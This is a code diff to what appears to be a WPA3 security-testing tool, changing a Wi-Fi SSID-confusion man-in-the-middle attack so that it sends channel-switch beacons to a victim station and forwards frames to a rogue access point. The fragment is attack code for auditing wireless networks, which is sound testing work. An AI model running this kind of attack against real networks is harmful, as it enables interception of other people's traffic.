@@ -1,6 +1,7 @@
 #include "attacks/mc_mitm/mc_mitm.h"
 #include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
 #include "attacks/mc_mitm/wifi_util.h"
+#include "logger/error_log.h"
 #include "system/hw_capabilities.h"
 
 namespace wpa3_tester::ssid_confusion {
@@ -13,7 +14,7 @@ void SsidConfusion::send_to_rogue(PDU &pdu) const {
 	send_to_rogue(raw);
 }
 
-void SsidConfusion::send_to_rogue(const vector<uint8_t> &raw) const {
+void SsidConfusion::send_to_rogue(const frame_raw_t &raw) const {
 	auto translated = ensure_radiotap(raw);
 	translate_data_mac(translated, ap->get(SK::mac), rogue_ap->get(SK::mac));
 	sock_rogue->send(translated, netconfig.rogue_channel);
@@ -21,7 +22,7 @@ void SsidConfusion::send_to_rogue(const vector<uint8_t> &raw) const {
 
 FrameProcess SsidConfusion::handle_eapol_real(
 	const HWAddress<6> addr2, const PDU &pdu,
-	const vector<uint8_t> &raw) const {
+	const frame_raw_t &raw) const {
 	// EAPOL AP -> STA on real channel
 	if(addr2 == ap.get(SK::mac) && is_eapol(pdu)) {
 		//TODO check first M1as PMKSA cache hit -> force EAP restart
@@ -37,13 +38,16 @@ FrameProcess SsidConfusion::handle_eapol_real(
 
 FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) const {
 	if(dot11.find_pdu<Dot11ProbeRequest>() || dot11.find_pdu<Dot11ProbeResponse>()){
-		if(addr2 == sta.get(SK::mac)) display_traffic(dot11, "Real channel", " -- Ignore");
+		if(addr2 == sta.get(SK::mac)){
+			display_traffic(dot11, "Real channel", " -- send CSA");
+			send_csa_beacon();
+		}
 		return STOP;
 	}
 	return CONTINUE;
 }
 
-void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const std::vector<uint8_t> &raw) {
+void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
 	auto *dot11 = pdu->find_pdu<Dot11>();
 	if(!dot11) return;
 	//filter out different channels
